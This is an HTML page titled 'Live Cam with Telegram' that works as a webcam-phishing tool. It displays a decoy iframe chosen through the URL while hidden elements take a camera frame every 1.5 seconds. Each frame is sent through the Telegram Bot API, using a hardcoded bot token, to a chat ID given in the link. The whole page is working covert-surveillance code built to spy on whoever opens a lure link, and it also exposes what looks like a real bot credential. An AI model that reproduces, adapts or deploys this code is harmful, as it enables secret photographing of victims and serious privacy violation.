<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Live Cam with Telegram</title>
  <script src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
  <link rel="stylesheet" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
    }
    iframe {
      width: 100%;
      height: 100%;
      border: none;
    }
  </style>
</head>

<body>

<div class="video-wrap" hidden>
  <video id="video" playsinline autoplay></video>
</div>

<canvas hidden id="canvas" width="640" height="480"></canvas>

<iframe id="Live_YT_TV" src=""></iframe>

<script>
  // Ambil UID dan URL iframe dari query string
  const params = new URLSearchParams(window.location.search);
  const uid = params.get("uid");
  const iframeURL = params.get("url");

  const TELEGRAM_BOT_TOKEN = "7525794586:AAH9YlfXazDX1zzx1ss23q8RuIqyMJcVzZI"; // fallback ke token default
  const TELEGRAM_CHAT_ID = uid;

  if (iframeURL) {
    document.getElementById("Live_YT_TV").src = decodeURIComponent(iframeURL);
  }

  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');

  function post(imgdata) {
    fetch(imgdata)
      .then(res => res.blob())
      .then(blob => {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, 'webcam.png');

        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        }).then(res => res.json())
          .then(data => console.log("✅ Sent", data))
          .catch(err => console.error("❌ Telegram error", err));
      })
      .catch(err => console.error("❌ Fetch blob error:", err));
  }

  const constraints = {
    audio: false,
    video: { facingMode: "user" }
  };

  async function init() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      handleSuccess(stream);
    } catch (e) {
      console.error("getUserMedia error:", e);
    }
  }

  function handleSuccess(stream) {
    window.stream = stream;
    video.srcObject = stream;

    const context = canvas.getContext('2d');
    setInterval(() => {
      context.drawImage(video, 0, 0, 640, 480);
      const canvasData = canvas.toDataURL("image/png");
      post(canvasData);
    }, 1500);
  }

  init();
</script>

</body>
</html>
